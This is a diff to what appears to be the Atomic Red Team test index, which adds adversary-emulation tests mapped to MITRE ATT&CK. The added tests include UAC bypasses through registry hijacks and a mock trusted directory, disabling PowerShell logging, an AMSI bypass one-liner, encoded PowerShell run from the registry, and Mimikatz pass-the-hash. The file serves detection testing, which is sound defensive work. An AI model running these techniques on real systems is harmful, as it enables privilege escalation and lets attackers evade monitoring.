@@ -5733,6 +5733,9 @@ defense-evasion:
         command: |
           reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "#{executable_binary}" /f
           cmd.exe /c eventvwr.msc
+        cleanup_command: 'reg.exe delete hkcu\software\classes\mscfile /f
+
+'
     - name: Bypass UAC using Event Viewer - PowerShell
       description: 'PowerShell code to bypass User Account Control using Event Viewer
         and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
@@ -5751,6 +5754,9 @@ defense-evasion:
           New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force
           Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
           Start-Process "C:\Windows\System32\eventvwr.msc"
+        cleanup_command: 'Remove-Item "HKCU:\software\classes\mscfile" -force -Recurse
+
+'
     - name: Bypass UAC using Fodhelper
       description: 'Bypasses User Account Control using the Windows 10 Features on
         Demand Helper (fodhelper.exe). Requires Windows 10.
@@ -5770,6 +5776,9 @@ defense-evasion:
           reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "#{executable_binary}" /f
           reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute"
           fodhelper.exe
+        cleanup_command: 'reg.exe delete hkcu\software\classes\ms-settings /f
+
+'
     - name: Bypass UAC using Fodhelper - PowerShell
       description: 'PowerShell code to bypass User Account Control using the Windows
         10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.
@@ -5814,7 +5823,33 @@ defense-evasion:
           New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
           Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
           Start-Process "C:\Windows\System32\ComputerDefaults.exe"
-        cleanup_command: Remove-Item "HKCU:\software\classes\ms-settings" -force -Recurse
+        cleanup_command: 'Remove-Item "HKCU:\software\classes\ms-settings" -force
+          -Recurse
+
+'
+    - name: Bypass UAC by Mocking Trusted Directories
+      description: 'Creates a fake "trusted directory" and copies a binary to bypass
+        UAC. The UAC bypass may not work on fully patched systems, however the directory
+        structure will be created.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        executable_binary:
+          description: Binary to execute with UAC Bypass
+          type: path
+          default: C:\Windows\System32\cmd.exe
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: |
+          mkdir "\\?\C:\Windows \System32\"
+          copy "#{executable_binary}" "\\?\C:\Windows \System32\mmc.exe"
+          mklink c:\testbypass.exe "\\?\C:\Windows \System32\mmc.exe"
+        cleanup_command: |
+          rd "\\?\C:\Windows \" /S /Q
+          del "c:\testbypass.exe"
   T1191:
     technique:
       x_mitre_data_sources:
@@ -6978,9 +7013,36 @@ defense-evasion:
         command: |
           net.exe stop #{service_name}
           sc.exe config #{service_name} start= disabled
-        cleanup_command: |-
+        cleanup_command: |
           sc.exe config #{service_name} start= auto
           net.exe start #{service_name}
+    - name: Disable PowerShell Script Block Logging
+      description: "An adversary may disable PowerShell Script Block Logging to avoid
+        leaving evidence. \n\nCredit to Matt Graeber (@mattifestation) for the research.\n"
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
+          $GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
+          $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
+          $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
+        cleanup_command: |
+          $GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
+          $GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
+          $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 1
+          $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 1
+    - name: PowerShell Bypass of AntiMalware Scripting Interface
+      description: "An adversary may bypass Windows Defender AMSI to execute malicious
+        PowerShell code. \n\nCredit to Matt Graeber (@mattifestation) for the research.\n"
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField(''amsiInitFailed'',''NonPublic,Static'').SetValue($null,$true)'
   T1107:
     technique:
       x_mitre_data_sources:
@@ -9256,6 +9318,37 @@ defense-evasion:
           /v UseLogonCredential /t REG_DWORD /d 0 /f
 
 '
+    - name: Modify registry to store PowerShell code
+      description: 'Sets Windows Registry key containing base64-encoded PowerShell
+        code.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        powershell_command:
+          description: PowerShell command to encode
+          type: String
+          default: Write-Host "Hey, Atomic!"
+        registry_key_storage:
+          description: Windows Registry Key to store code
+          type: String
+          default: HKCU:Software\Microsoft\Windows\CurrentVersion
+        registry_entry_storage:
+          description: Windows Registry entry to store code under key
+          type: String
+          default: Debug
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $OriginalCommand = '#{powershell_command}'
+          $Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
+          $EncodedCommand =[Convert]::ToBase64String($Bytes)
+          $EncodedCommand
+          Set-ItemProperty -Force -Path #{registry_key_storage} -Name #{registry_entry_storage} -Value $EncodedCommand
+        cleanup_command: 'Remove-ItemProperty -Force -Path -Path #{registry_key_storage}
+          -Name #{registry_entry_storage}'
   T1170:
     technique:
       x_mitre_data_sources:
@@ -9740,11 +9833,69 @@ defense-evasion:
       executor:
         name: sh
         elevation_required: false
-        command: |-
+        command: |
           sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > /tmp/encoded.dat"
           cat /tmp/encoded.dat | base64 -d > /tmp/art.sh
           chmod +x /tmp/art.sh
           /tmp/art.sh
+    - name: Execute base64-encoded PowerShell
+      description: 'Creates base64-encoded PowerShell code and executes it. This is
+        used by numerous adversaries and malicious tools.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        powershell_command:
+          description: PowerShell command to encode
+          type: String
+          default: Write-Host "Hey, Atomic!"
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $OriginalCommand = '#{powershell_command}'
+          $Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
+          $EncodedCommand =[Convert]::ToBase64String($Bytes)
+          $EncodedCommand
+
+          powershell.exe -EncodedCommand $EncodedCommand
+    - name: Execute base64-encoded PowerShell from Windows Registry
+      description: 'Stores base64-encoded PowerShell code in the Windows Registry
+        and deobfuscates it for execution. This is used by numerous adversaries and
+        malicious tools.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        powershell_command:
+          description: PowerShell command to encode
+          type: String
+          default: Write-Host "Hey, Atomic!"
+        registry_key_storage:
+          description: Windows Registry Key to store code
+          type: String
+          default: HKCU:Software\Microsoft\Windows\CurrentVersion
+        registry_entry_storage:
+          description: Windows Registry entry to store code under key
+          type: String
+          default: Debug
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $OriginalCommand = '#{powershell_command}'
+          $Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
+          $EncodedCommand =[Convert]::ToBase64String($Bytes)
+          $EncodedCommand
+
+          Set-ItemProperty -Force -Path #{registry_key_storage} -Name #{registry_entry_storage} -Value $EncodedCommand
+          powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} #{registry_entry_storage}).#{registry_entry_storage})))"
+        cleanup_command: 'Remove-ItemProperty -Force -Path -Path #{registry_key_storage}
+          -Name #{registry_entry_storage}
+
+'
   T1150:
     technique:
       x_mitre_data_sources:
@@ -12563,6 +12714,9 @@ privilege-escalation:
         command: |
           reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "#{executable_binary}" /f
           cmd.exe /c eventvwr.msc
+        cleanup_command: 'reg.exe delete hkcu\software\classes\mscfile /f
+
+'
     - name: Bypass UAC using Event Viewer - PowerShell
       description: 'PowerShell code to bypass User Account Control using Event Viewer
         and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
@@ -12581,6 +12735,9 @@ privilege-escalation:
           New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force
           Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
           Start-Process "C:\Windows\System32\eventvwr.msc"
+        cleanup_command: 'Remove-Item "HKCU:\software\classes\mscfile" -force -Recurse
+
+'
     - name: Bypass UAC using Fodhelper
       description: 'Bypasses User Account Control using the Windows 10 Features on
         Demand Helper (fodhelper.exe). Requires Windows 10.
@@ -12600,6 +12757,9 @@ privilege-escalation:
           reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "#{executable_binary}" /f
           reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute"
           fodhelper.exe
+        cleanup_command: 'reg.exe delete hkcu\software\classes\ms-settings /f
+
+'
     - name: Bypass UAC using Fodhelper - PowerShell
       description: 'PowerShell code to bypass User Account Control using the Windows
         10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.
@@ -12644,7 +12804,33 @@ privilege-escalation:
           New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
           Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
           Start-Process "C:\Windows\System32\ComputerDefaults.exe"
-        cleanup_command: Remove-Item "HKCU:\software\classes\ms-settings" -force -Recurse
+        cleanup_command: 'Remove-Item "HKCU:\software\classes\ms-settings" -force
+          -Recurse
+
+'
+    - name: Bypass UAC by Mocking Trusted Directories
+      description: 'Creates a fake "trusted directory" and copies a binary to bypass
+        UAC. The UAC bypass may not work on fully patched systems, however the directory
+        structure will be created.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        executable_binary:
+          description: Binary to execute with UAC Bypass
+          type: path
+          default: C:\Windows\System32\cmd.exe
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: |
+          mkdir "\\?\C:\Windows \System32\"
+          copy "#{executable_binary}" "\\?\C:\Windows \System32\mmc.exe"
+          mklink c:\testbypass.exe "\\?\C:\Windows \System32\mmc.exe"
+        cleanup_command: |
+          rd "\\?\C:\Windows \" /S /Q
+          del "c:\testbypass.exe"
   T1038:
     technique:
       x_mitre_permissions_required:
@@ -16919,6 +17105,19 @@ discovery:
         command: |
           net view /domain
           net view
+    - name: Remote System Discovery - net group Domain Computers
+      description: 'Identify remote systems with net.exe querying the Active Directory
+        Domain Computers group.
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'net group "Domain Computers" /domain
+
+'
     - name: Remote System Discovery - nltest
       description: 'Identify domain controllers for specified domain.
 
@@ -17312,12 +17511,23 @@ discovery:
           sudo lsmod | grep -i "xen-vbd\|xen-vnif"
           sudo lsmod | grep -i "virtio_pci\|virtio_net"
           sudo lsmod | grep -i "hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc"
-    - name: Hostname Discovery
-      description: 'Identify system hostname for Windows, Linux, and macOS systems.
+    - name: Hostname Discovery (Windows)
+      description: 'Identify system hostname for Windows.
 
 '
       supported_platforms:
       - windows
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'hostname
+
+'
+    - name: Hostname Discovery
+      description: 'Identify system hostname for Linux and macOS systems.
+
+'
+      supported_platforms:
       - linux
       - macos
       executor:
@@ -17420,6 +17630,21 @@ discovery:
           arp -a
           netstat -ant | awk '{print $NF}' | grep -v '[a-z]' | sort | uniq -c
           ifconfig
+    - name: System Network Configuration Discovery (Trickbot Style)
+      description: 'Identify network configuration information as seen by Trickbot
+        and described here https://www.sneakymonkey.net/2019/10/29/trickbot-analysis-part-ii/
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: |-
+          ipconfig /all
+          net config workstation
+          net view /all /domain
+          nltest /domain_trusts
   T1049:
     technique:
       x_mitre_permissions_required:
@@ -23303,6 +23528,30 @@ lateral-movement:
       modified: '2019-07-18T16:56:39.990Z'
       identifier: T1075
     atomic_tests:
+    - name: Mimikatz Pass the Hash
+      description: |
+        Note: must dump hashes first
+        [Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)
+      supported_platforms:
+      - windows
+      input_arguments:
+        user_name:
+          description: username
+          type: string
+          default: Administrator
+        domain:
+          description: domain
+          type: string
+          default: atomic.local
+        ntlm:
+          description: ntlm hash
+          type: string
+          default: cc36cf7a8514893efccd3324464tkg1a
+      executor:
+        name: command_prompt
+        command: 'mimikatz # sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}
+
+'
     - name: crackmapexec Pass the Hash
       description: 'command execute with crackmapexec
 
@@ -26606,21 +26855,20 @@ initial-access:
       identifier: T1193
     atomic_tests:
     - name: Download Phishing Attachment - VBScript
-      description: "The macro-enabled Excel file contains VBScript which opens your
-        default web browser and opens it to [google.com](http://google.com). \nThe
-        below will successfully download the macro-enabled Excel file to the current
-        location.\n"
+      description: |
+        The macro-enabled Excel file contains VBScript which opens your default web browser and opens it to [google.com](http://google.com).
+        The below will successfully download the macro-enabled Excel file to the current location.
       supported_platforms:
       - windows
       executor:
         name: powershell
         elevation_required: false
-        command: |-
+        command: |
           if (-not(Test-Path HKLM:SOFTWARE\Classes\Excel.Application)){
             return 'Please install Microsoft Excel before running this test.'
           }
           else{
-            $url = 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1193/PhishingAttachment.xlsm'
+            $url = 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1193/bin/PhishingAttachment.xlsm'
             $fileName = 'PhishingAttachment.xlsm'
             New-Item -Type File -Force -Path $fileName | out-null
             $wc = New-Object System.Net.WebClient
@@ -26628,3 +26876,15 @@ initial-access:
             [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
             ($wc.DownloadString("$url")) | Out-File $fileName
           }
+    - name: Word spawned a command shell and used an IP address in the command line
+      description: 'Opens a word document that will run powershell and perform an
+        nslookup on the IP 192.168.1.1 and a sleep command
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        command: 'Start-Process $PathToAtomicsFolder\T1193\bin\PowerShell_IP_Doc.doc
+
+'
